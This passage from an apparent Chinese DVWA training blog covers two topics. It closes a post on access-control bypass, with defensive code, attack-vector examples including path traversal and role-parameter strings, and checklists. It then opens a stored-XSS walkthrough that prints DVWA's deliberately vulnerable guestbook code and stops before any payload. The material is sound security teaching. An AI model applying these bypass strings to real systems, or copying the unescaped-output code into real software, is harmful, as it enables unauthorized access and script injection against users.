<h4 id="4-防止参数篡改"><a href="#4-防止参数篡改" class="headerlink" title="4. 防止参数篡改"></a>4. 防止参数篡改</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 危险：从用户输入获取角色</span></span><br><span class="line"><span class="variable">$role</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;role&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 安全：从服务器端Session/数据库获取</span></span><br><span class="line"><span class="variable">$role</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_role&#x27;</span>];</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="variable">$role</span> = <span class="title function_ invoke__">getUserRoleFromDatabase</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<h3 id="监控层面"><a href="#监控层面" class="headerlink" title="监控层面"></a>监控层面</h3><h4 id="1-记录所有授权失败"><a href="#1-记录所有授权失败" class="headerlink" title="1. 记录所有授权失败"></a>1. 记录所有授权失败</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logAuthorizationFailure</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$action</span>, <span class="variable">$resource</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = [</span><br><span class="line">        <span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$user</span>,</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">        <span class="string">&#x27;resource&#x27;</span> =&gt; <span class="variable">$resource</span>,</span><br><span class="line">        <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入日志</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">        <span class="string">&#x27;/var/log/security/authz_failures.log&#x27;</span>,</span><br><span class="line">        <span class="title function_ invoke__">json_encode</span>(<span class="variable">$log</span>) . <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">        FILE_APPEND</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果失败次数过多，触发警报</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">countRecentFailures</span>(<span class="variable">$user</span>) &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertSecurity</span>(<span class="string">&quot;Possible privilege escalation attempt by <span class="subst">$user</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-异常行为检测"><a href="#2-异常行为检测" class="headerlink" title="2. 异常行为检测"></a>2. 异常行为检测</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测异常访问模式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectAnomalousAccess</span>(<span class="params"><span class="variable">$userId</span>, <span class="variable">$accessedUserId</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 用户A频繁尝试访问不同用户</span></span><br><span class="line">    <span class="variable">$recentAccesses</span> = <span class="title function_ invoke__">getRecentAccesses</span>(<span class="variable">$userId</span>, <span class="number">3600</span>); <span class="comment">// 过去1小时</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$uniqueTargets</span> = <span class="title function_ invoke__">array_unique</span>(<span class="variable">$recentAccesses</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$uniqueTargets</span>) &gt; <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="comment">// 可能在枚举用户</span></span><br><span class="line">        <span class="title function_ invoke__">alertSecurity</span>(<span class="string">&quot;User <span class="subst">$userId</span> is accessing too many different users&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">lockAccount</span>(<span class="variable">$userId</span>, <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="框架层面"><a href="#框架层面" class="headerlink" title="框架层面"></a>框架层面</h3><h4 id="Laravel示例"><a href="#Laravel示例" class="headerlink" title="Laravel示例"></a>Laravel示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义策略</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserPolicy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view</span>(<span class="params">User <span class="variable">$currentUser</span>, User <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 管理员可以查看所有用户</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$currentUser</span>-&gt;<span class="title function_ invoke__">isAdmin</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用户只能查看自己</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$currentUser</span>-&gt;id === <span class="variable">$user</span>-&gt;id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">User <span class="variable">$currentUser</span>, User <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$currentUser</span>-&gt;<span class="title function_ invoke__">isAdmin</span>() || <span class="variable">$currentUser</span>-&gt;id === <span class="variable">$user</span>-&gt;id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params">User <span class="variable">$currentUser</span>, User <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 只有管理员可以删除</span></span><br><span class="line">        <span class="comment">// 且不能删除自己</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$currentUser</span>-&gt;<span class="title function_ invoke__">isAdmin</span>() &amp;&amp; <span class="variable">$currentUser</span>-&gt;id !== <span class="variable">$user</span>-&gt;id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在控制器中使用</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">User <span class="variable">$user</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">authorize</span>(<span class="string">&#x27;view&#x27;</span>, <span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&#x27;users.show&#x27;</span>, <span class="title function_ invoke__">compact</span>(<span class="string">&#x27;user&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用中间件"><a href="#使用中间件" class="headerlink" title="使用中间件"></a>使用中间件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义中间件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminMiddleware</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="variable">$next</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">auth</span>()-&gt;<span class="title function_ invoke__">user</span>()-&gt;<span class="title function_ invoke__">isAdmin</span>()) &#123;</span><br><span class="line">            <span class="title function_ invoke__">abort</span>(<span class="number">403</span>, <span class="string">&#x27;Forbidden&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路由中使用</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">middleware</span>([<span class="string">&#x27;auth&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>])-&gt;<span class="title function_ invoke__">group</span>(function () &#123;</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/admin/users&#x27;</span>, <span class="string">&#x27;AdminController@users&#x27;</span>);</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">delete</span>(<span class="string">&#x27;/admin/users/&#123;id&#125;&#x27;</span>, <span class="string">&#x27;AdminController@deleteUser&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
<thead>
<tr>
<th>特性</th>
<th>Low</th>
<th>Medium</th>
<th>High</th>
<th>Impossible</th>
</tr>
</thead>
<tbody><tr>
<td>认证检查</td>
<td>✅</td>
<td>✅</td>
<td>✅</td>
<td>✅</td>
</tr>
<tr>
<td>授权检查</td>
<td>❌</td>
<td>弱Referer检查</td>
<td>角色检查</td>
<td>完善检查</td>
</tr>
<tr>
<td>资源所有权</td>
<td>❌</td>
<td>❌</td>
<td>弱验证</td>
<td>✅ 严格验证</td>
</tr>
<tr>
<td>CSRF防护</td>
<td>❌</td>
<td>❌</td>
<td>✅</td>
<td>✅</td>
</tr>
<tr>
<td>角色管理</td>
<td>❌</td>
<td>弱角色检查</td>
<td>数据库角色</td>
<td>RBAC</td>
</tr>
<tr>
<td>输入验证</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅</td>
</tr>
<tr>
<td>审计日志</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅</td>
</tr>
<tr>
<td>类型安全</td>
<td>❌</td>
<td>❌</td>
<td>&#x3D;&#x3D;</td>
<td>&#x3D;&#x3D;&#x3D;</td>
</tr>
<tr>
<td>攻击难度</td>
<td>极易</td>
<td>简单</td>
<td>中等</td>
<td>极难</td>
</tr>
</tbody></table>
<hr>
<h2 id="常见攻击向量"><a href="#常见攻击向量" class="headerlink" title="常见攻击向量"></a>常见攻击向量</h2><h3 id="1-直接对象引用（IDOR）"><a href="#1-直接对象引用（IDOR）" class="headerlink" title="1. 直接对象引用（IDOR）"></a>1. 直接对象引用（IDOR）</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正常：<span class="regexp">/user/</span>profile?id=<span class="number">123</span>（自己的ID）</span><br><span class="line">攻击：<span class="regexp">/user/</span>profile?id=<span class="number">456</span>（他人的ID）</span><br></pre></td></tr></table></figure>

<h3 id="2-参数污染"><a href="#2-参数污染" class="headerlink" title="2. 参数污染"></a>2. 参数污染</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">admin</span>?<span class="keyword">role</span>=<span class="keyword">admin</span>&amp;user_id=<span class="number">5</span></span><br><span class="line">/api/users/<span class="number">5</span>?<span class="keyword">admin</span>=<span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h3 id="3-路径遍历"><a href="#3-路径遍历" class="headerlink" title="3. 路径遍历"></a>3. 路径遍历</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/../</span>..<span class="regexp">/admin/</span>panel</span><br><span class="line"><span class="regexp">/admin/</span>%<span class="number">2</span>e%<span class="number">2</span>e/panel</span><br></pre></td></tr></table></figure>

<h3 id="4-HTTP方法绕过"><a href="#4-HTTP方法绕过" class="headerlink" title="4. HTTP方法绕过"></a>4. HTTP方法绕过</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> /<span class="keyword">admin</span> → <span class="number">403</span> Forbidden</span><br><span class="line">POST /<span class="keyword">admin</span> → <span class="number">200</span> OK（如果只检查<span class="keyword">GET</span>）</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>渗透测试清单：</strong></p>
<ol>
<li>✅ 枚举所有功能和端点</li>
<li>✅ 测试水平越权（访问其他用户数据）</li>
<li>✅ 测试垂直越权（访问管理员功能）</li>
<li>✅ 修改用户ID&#x2F;角色参数</li>
<li>✅ 测试IDOR漏洞</li>
<li>✅ 尝试不同HTTP方法</li>
<li>✅ 检查隐藏的管理功能</li>
</ol>
<p><strong>防御清单：</strong></p>
<ol>
<li>✅ 实施RBAC</li>
<li>✅ 每个操作都验证权限</li>
<li>✅ 验证资源所有权</li>
<li>✅ 使用CSRF Token</li>
<li>✅ 记录所有授权失败</li>
<li>✅ 最小权限原则</li>
<li>✅ 定期审计权限</li>
</ol>
<p><strong>道德准则：</strong></p>
<ul>
<li>只在授权环境测试</li>
<li>不越权访问真实用户数据</li>
<li>学习是为了构建安全的访问控制</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en,zh-CN,default">
    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/XSS_Stored_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="caixuya">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tia的学习笔记">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/20/XSS_Stored_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">DVWA - XSS Stored (存储型XSS) 攻防练习详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:26:05" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
</ul>
<hr>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是存储型XSS（Stored-Cross-Site-Scripting）？"><a href="#什么是存储型XSS（Stored-Cross-Site-Scripting）？" class="headerlink" title="什么是存储型XSS（Stored Cross-Site Scripting）？"></a>什么是存储型XSS（Stored Cross-Site Scripting）？</h3><p>存储型XSS也称为持久化XSS，攻击者将恶意脚本存储在服务器端（数据库、文件等），当其他用户访问包含恶意数据的页面时，脚本会自动执行。</p>
<p><strong>攻击流程：</strong></p>
<ol>
<li>攻击者提交恶意脚本到服务器</li>
<li>服务器将恶意脚本存储到数据库</li>
<li>其他用户访问页面</li>
<li>服务器从数据库读取恶意脚本并输出</li>
<li>用户浏览器执行恶意脚本</li>
</ol>
<p><strong>危害：</strong></p>
<ul>
<li>持久化攻击（一次注入，多次触发）</li>
<li>影响所有访问用户</li>
<li>蠕虫传播（自我复制）</li>
<li>窃取管理员Cookie</li>
<li>网站挂马</li>
<li>完全控制用户会话</li>
</ul>
<p><strong>与反射型XSS的区别：</strong></p>
<ul>
<li>反射型：一次性，需要用户点击链接</li>
<li>存储型：持久化，所有访问用户都会中招</li>
</ul>
<p><strong>DVWA场景：</strong><br>留言板（Guestbook），用户可以提交姓名和留言。</p>
<hr>
<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完全未过滤的留言板，恶意脚本永久存储。</p>
<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了留言表单</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否存在且非NULL</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接获取用户输入，无任何过滤 ★★★</span></span><br><span class="line">    <span class="comment">// $_POST - 从POST请求体获取数据</span></span><br><span class="line">    <span class="comment">// trim() - 只是去除首尾空格，不做任何安全处理</span></span><br><span class="line">    <span class="comment">// mysql_real_escape_string() - 只防SQL注入，不防XSS！</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：mysql_real_escape_string只转义SQL特殊字符</span></span><br><span class="line">    <span class="comment">// 不转义HTML特殊字符&lt;&gt;，所以XSS payload可以正常存储</span></span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对SQL特殊字符转义（防SQL注入）</span></span><br><span class="line">    <span class="comment">// 但不防止XSS攻击！</span></span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 将用户输入直接插入数据库 ★★★</span></span><br><span class="line">    <span class="comment">// INSERT INTO - SQL插入语句</span></span><br><span class="line">    <span class="comment">// guestbook - 留言板表</span></span><br><span class="line">    <span class="comment">// name, comment - 字段名</span></span><br><span class="line">    <span class="comment">// 恶意脚本被原封不动地存储到数据库</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行SQL插入</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显示成功消息</span></span><br><span class="line">    <span class="comment">// header() - 设置HTTP响应头</span></span><br><span class="line">    <span class="comment">// Location - 重定向到指定URL</span></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>显示留言的代码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 从数据库读取并显示留言 ★★★</span></span><br><span class="line"><span class="comment">// SELECT - SQL查询语句</span></span><br><span class="line"><span class="comment">// guestbook - 留言板表</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM guestbook&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行查询</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历所有留言</span></span><br><span class="line"><span class="comment">// mysql_fetch_assoc() - 获取结果行作为关联数组</span></span><br><span class="line"><span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接输出数据库内容，无任何编码 ★★★</span></span><br><span class="line">    <span class="comment">// $row[ &#x27;comment&#x27; ] - 留言内容（可能包含恶意脚本）</span></span><br><span class="line">    <span class="comment">// $row[ &#x27;name&#x27; ] - 姓名（可能包含恶意脚本）</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：直接输出，浏览器会执行其中的脚本！</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;comment&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;name&#x27;&gt;&quot;</span> . <span class="variable">$row</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;message&#x27;&gt;&quot;</span> . <span class="variable">$row</span>[ <span class="string">&#x27;comment&#x27;</span> ] . <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭数据库连接</span></span><br><span class="line"><span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>存储流程：</strong></p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户输入 → <span class="built_in">trim</span>() → <span class="built_in">mysql_real_escape_string</span>() → 存入数据库</span><br></pre></td></tr></table></figure>

<p><strong>输出流程：</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据库 → 直接输出 → 浏览器执行</span><br></pre></td></tr></table></figure>

<p><strong>核心问题：</strong></p>
<ol>
<li><strong>mysql_real_escape_string()不防XSS</strong> - 只转义<code>&#39;</code>、<code>&quot;</code>、<code>\</code>等SQL字符</li>
<li><strong>不转义HTML字符</strong> - <code>&lt;&gt;</code>、<code>&amp;</code>等直接存储</li>
<li><strong>输出时无编码</strong> - 直接echo数据库内容</li>
<li><strong>永久存储</strong> - 恶意脚本一直存在，所有访问者都会执行</li>
</ol>
<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：基础XSS攻击"><a href="#步骤1：基础XSS攻击" class="headerlink" title="步骤1：基础XSS攻击"></a>步骤1：基础XSS攻击</h4><p><strong>攻击1：在Name字段注入</strong></p>
